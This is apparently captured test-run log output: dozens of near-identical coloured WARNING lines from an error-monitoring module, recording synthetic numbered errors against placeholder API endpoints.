WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899611Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3938'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899658Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3939'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899708Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3940'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899756Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3941'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899806Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3942'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899855Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3943'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899903Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3944'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.899953Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3945'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900036Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3946'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900118Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3947'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900176Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3948'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900228Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m79[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3949'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900278Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3950'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900327Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3951'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900379Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3952'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900428Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3953'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900476Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3954'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900524Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3955'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900575Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3956'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900630Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3957'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900682Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3958'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900733Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3959'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900783Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3960'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900831Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3961'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900879Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3962'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900927Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3963'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.900976Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3964'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901024Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3965'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901072Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3966'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901120Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3967'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901167Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3968'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901216Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3969'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901263Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3970'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901311Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3971'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901358Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3972'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901407Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3973'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901458Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3974'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901506Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3975'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901555Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3976'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.901604Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m80[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3977'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
